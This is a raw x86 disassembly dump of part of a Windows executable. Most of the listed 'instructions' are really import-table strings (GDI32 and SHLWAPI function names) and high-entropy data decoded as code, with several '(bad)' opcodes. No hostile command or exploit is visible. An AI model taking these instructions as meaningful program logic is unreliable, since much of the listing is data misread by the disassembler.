  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	loop   0x413f91
  413f64:	cmp    DWORD PTR [ebp+0x67],ebp
  413f67:	xlat   BYTE PTR ds:[ebx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	xchg   edx,eax
  413f6f:	adc    al,0x13
  413f71:	xor    eax,0xf94a6074
  413f76:	and    al,0x41
  413f78:	test   eax,0xc47167ce
  413f7d:	jmp    0x5beaeb5e
  413f82:	in     eax,0x4d
  413f84:	and    eax,0xcd2889af
  413f89:	aad    0x8
  413f8b:	leave  
  413f8c:	into   
  413f8d:	out    0xa2,eax
  413f8f:	pop    edx
  413f90:	push   esi
  413f91:	mov    ebx,0x1ecc0dc0
  413f96:	push   edi
  413f97:	or     DWORD PTR [ebp+0x6fbc0d6c],ebp
  413f9d:	mov    dl,0x83
  413f9f:	or     eax,0xe28e6b65
  413fa4:	(bad)  
  413fa5:	js     0x413f7d
  413fa7:	loopne 0x413fe1
  413fa9:	out    0xa0,eax
  413fab:	inc    eax
  413fac:	push   esi
  413fad:	imul   ebp,DWORD PTR [edi+eax*4-0x7297f949],0xffffff83
  413fb5:	or     DWORD PTR [ebx-0x23],ecx
  413fb8:	(bad)  
  413fb9:	shr    BYTE PTR [edi+0xf360b1e],cl
  413fbf:	lahf   
  413fc0:	add    eax,0xbbc1c502
  413fc5:	cdq    
  413fc6:	mov    dh,0x83
  413fc8:	mov    esp,0xd25b1a58
  413fcd:	cwde   
  413fce:	(bad)  [ebx-0x4ad900e2]
  413fd4:	xor    BYTE PTR [eax],al
  413fd6:	push   ebp
  413fd7:	jmp    0x6f66:0x78fd
  413fdd:	pop    edi
  413fde:	jbe    0x413fce
  413fe0:	aad    0x8d
  413fe2:	imul   edx,edi,0x320eac2a
  413fe8:	aam    0xae
  413fea:	loopne 0x413fe5
  413fec:	mov    bl,0x1e
  413fee:	pop    ebx
  413fef:	int    0xeb
  413ff1:	dec    edx
  413ff2:	xchg   edi,eax
  413ff3:	push   esp
  413ff4:	inc    eax
  413ff5:	cdq    
  413ff6:	ror    BYTE PTR [esi],cl
  413ff8:	jecxz  0x413f7a
  413ffa:	imul   esp,DWORD PTR [edi-0x32],0xffffff9e
  413ffe:	mov    eax,0xa1eab98d
  414003:	nop
  414004:	xor    ebp,eax
  414006:	mov    esp,0x9e525d76
  41400b:	outs   dx,DWORD PTR ds:[esi]
  41400c:	mov    al,ds:0xa5d1f832
  414011:	cmc    
  414012:	dec    edx
  414013:	addr16 mov edx,edx
  414016:	popf   
  414017:	in     al,dx
